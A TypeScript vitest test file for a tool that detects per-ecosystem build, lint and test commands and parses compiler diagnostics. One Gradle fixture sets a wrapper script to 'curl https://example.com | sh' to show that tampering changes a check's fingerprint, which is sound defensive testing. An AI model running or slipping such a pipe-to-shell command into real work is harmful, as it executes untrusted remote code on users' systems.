import { describe, expect, it } from 'vitest';
import type { PlannedCheck } from '../../src/core/model';
import { toSpawnInvocation } from '../../src/infrastructure/process-runner';
import { detectChecks } from '../../src/verification/check-detector';
import { parseDiagnostics } from '../../src/verification/diagnostics-parser';

function detect(files: Record<string, string>, platform: NodeJS.Platform = 'linux'): Promise<PlannedCheck[]> {
  const exists = (p: string) => p in files || Object.keys(files).some((f) => f.startsWith(`${p}/`));
  return detectChecks({ readText: (p) => Promise.resolve(files[p]), exists: (p) => Promise.resolve(exists(p)) }, platform);
}

const summary = (checks: readonly PlannedCheck[]) => checks.map((c) => `${c.kind}: ${c.command.executable} ${c.command.args.join(' ')}`);

describe('PHP', () => {
  it('prefers Composer scripts and warns when vendor is missing', async () => {
    const checks = await detect({ 'composer.json': JSON.stringify({ scripts: { test: 'phpunit', phpstan: ['phpstan analyse'] } }) });
    expect(summary(checks)).toEqual(['typecheck: composer run-script phpstan --no-interaction', 'test: composer run-script test --no-interaction']);
    expect(checks.every((c) => c.runsRepositoryCode)).toBe(true);
    expect(checks[0]?.warnings.join(' ')).toMatch(/vendor is missing/);
  });

  it('falls back to the tools in vendor/bin, PHPUnit only with its configuration', async () => {
    const base = { 'composer.json': '{}', 'vendor/bin/phpstan': '', 'vendor/bin/phpunit': '', 'vendor/autoload.php': '' };
    expect(summary(await detect(base))).toEqual(['typecheck: php vendor/bin/phpstan analyse --no-progress --error-format=raw']);
    const checks = await detect({ ...base, 'phpunit.xml.dist': '' });
    expect(summary(checks)).toEqual(['typecheck: php vendor/bin/phpstan analyse --no-progress --error-format=raw', 'test: php vendor/bin/phpunit']);
    expect(checks[0]?.outputFormat).toBe('gnu');
  });
});

describe('Python', () => {
  const pyproject = '[project]\nname = "x"\n\n[tool.pytest.ini_options]\n\n[tool.ruff]\nline-length = 100\n\n[tool.mypy]\nstrict = true\n';

  it('uses the virtual environment and only the tools installed in it', async () => {
    const checks = await detect({ 'pyproject.toml': pyproject, '.venv/bin/python': '', '.venv/bin/pytest': '', '.venv/bin/ruff': '' });
    expect(summary(checks)).toEqual(['lint: .venv/bin/python -m ruff check --output-format=concise .', 'test: .venv/bin/python -m pytest']);
    expect(checks.find((c) => c.kind === 'lint')?.runsRepositoryCode).toBe(false);
  });

  it('uses Scripts/python.exe on Windows', async () => {
    const checks = await detect({ 'pyproject.toml': pyproject, '.venv/Scripts/python.exe': '', '.venv/Scripts/mypy.exe': '' }, 'win32');
    expect(checks.map((c) => c.command.executable)).toEqual(['.venv/Scripts/python.exe']);
    expect(checks[0]?.command.args).toEqual(['-m', 'mypy', '--show-column-numbers', '--no-error-summary', '--no-pretty', '--exclude', '(^|/)(\\.?venv|env|build|dist)/', '.']);
  });

  it('without a virtual environment, offers every configured tool with the interpreter on PATH and says so', async () => {
    const checks = await detect({ 'pyproject.toml': `${pyproject}files = ["src"]\n` });
    expect(checks.map((c) => `${c.command.executable} ${c.command.args[1] ?? ''}`)).toEqual(['python3 mypy', 'python3 ruff', 'python3 pytest']);
    expect(checks[0]?.command.args).not.toContain('--exclude');
    expect(checks[0]?.rationale).toMatch(/No virtual environment found/);
  });

  it('ignores Python files that configure no tool', async () => {
    expect(await detect({ 'requirements.txt': 'requests' })).toEqual([]);
  });
});

describe('Rust', () => {
  it('offers cargo check, clippy and test, all running repository code', async () => {
    const checks = await detect({ 'Cargo.toml': '[package]\nname = "x"' });
    expect(summary(checks)).toEqual([
      'typecheck: cargo check --all-targets --message-format=short',
      'lint: cargo clippy --all-targets --message-format=short',
      'test: cargo test',
    ]);
    expect(checks.every((c) => c.runsRepositoryCode)).toBe(true);
    expect(checks[1]?.requires.join(' ')).toMatch(/clippy/);
  });
});

describe('Java', () => {
  it('runs the Maven wrapper through sh, and through cmd on Windows', async () => {
    const linux = await detect({ 'pom.xml': '<project/>', mvnw: '#!/bin/sh' });
    expect(summary(linux)).toEqual(['build: sh mvnw -B --no-transfer-progress compile', 'test: sh mvnw -B --no-transfer-progress test']);
    expect(linux[0]?.label).toBe('./mvnw -B --no-transfer-progress compile');
    const windows = await detect({ 'pom.xml': '<project/>', 'mvnw.cmd': '@echo off' }, 'win32');
    expect(windows[0]?.command).toEqual({ executable: 'mvnw', args: ['-B', '--no-transfer-progress', 'compile'] });
    expect(toSpawnInvocation(windows[0]?.command ?? { executable: '', args: [] }, 'win32').file).toBe('cmd.exe');
  });

  it('uses gradle from PATH without a wrapper, and a changed wrapper changes the fingerprint', async () => {
    expect(summary(await detect({ 'build.gradle.kts': '' }))).toEqual(['build: gradle --console=plain assemble', 'test: gradle --console=plain test']);
    const [before] = await detect({ 'build.gradle': '', gradlew: 'exec java "$@"' });
    const [after] = await detect({ 'build.gradle': '', gradlew: 'curl https://example.com | sh' });
    expect(before?.fingerprint).not.toBe(after?.fingerprint);
  });
});

it('a polyglot repository gets the checks of each ecosystem in a stable order', async () => {
  const checks = await detect({ 'go.mod': 'module x', 'Cargo.toml': '', 'pom.xml': '' });
  expect(checks.map((c) => c.id)).toEqual(['go:build', 'go:vet', 'go:test', 'cargo:check', 'cargo:clippy', 'cargo:test', 'maven:compile', 'maven:test']);
});

describe('diagnostic formats', () => {
  it('reads file:line[:column] diagnostics from cargo, ruff and mypy', () => {
    const output = [
      'src/main.rs:4:5: error[E0308]: mismatched types',
      'app/models.py:12:8: F401 [*] `os` imported but unused',
      'app/views.py:30: error: Incompatible return value type  [return-value]',
      'error: could not compile `x` due to 1 previous error',
    ].join('\n');
    expect(parseDiagnostics(output, 'gnu').map((d) => `${d.file}:${d.line}:${d.column} ${d.code}`)).toEqual(['src/main.rs:4:5 ', 'app/models.py:12:8 ', 'app/views.py:30:1 ']);
  });

  it('turns absolute paths inside the run directory into repository paths and drops the rest', () => {
    const output = ['/repo/src/Foo.php:12:Undefined variable $x', '/usr/lib/php/x.php:1:outside', 'C:\\Repo\\src\\A.java:7: error: cannot find symbol'].join('\n');
    expect(parseDiagnostics(output, 'gnu', '', '/repo').map((d) => d.file)).toEqual(['src/Foo.php']);
    expect(parseDiagnostics(output, 'gnu', '', 'c:\\repo').map((d) => `${d.file}:${d.line}`)).toEqual(['src/A.java:7']);
  });

  it('reads colored output (ruff) and Maven URI-style Windows paths printed twice', () => {
    const esc = String.fromCharCode(27);
    const ruff = `${esc}[1mapp.py${esc}[0m${esc}[36m:${esc}[0m1${esc}[36m:${esc}[0m8${esc}[36m:${esc}[0m ${esc}[1m${esc}[31mF401${esc}[0m \`os\` imported but unused`;
    expect(parseDiagnostics(ruff, 'gnu').map((d) => `${d.file}:${d.line}:${d.column} ${d.message}`)).toEqual(['app.py:1:8 F401 `os` imported but unused']);
    const line = '[ERROR] /C:/Work/Repo/src/main/java/a/A.java:[3,22] cannot find symbol';
    expect(parseDiagnostics(`${line}\n[ERROR] Failed to execute goal\n${line}`, 'maven', '', 'C:\\work\\repo').map((d) => `${d.file}:${d.line}`)).toEqual(['src/main/java/a/A.java:3']);
  });

  it('reads the Maven compiler format', () => {
    const output = '[INFO] BUILD\n[ERROR] /work/repo/src/main/java/a/A.java:[12,5] cannot find symbol\n[ERROR] Failed to execute goal';
    expect(parseDiagnostics(output, 'maven', '', '/work/repo')).toEqual([{ file: 'src/main/java/a/A.java', line: 12, column: 5, code: '', message: 'cannot find symbol' }]);
  });
});
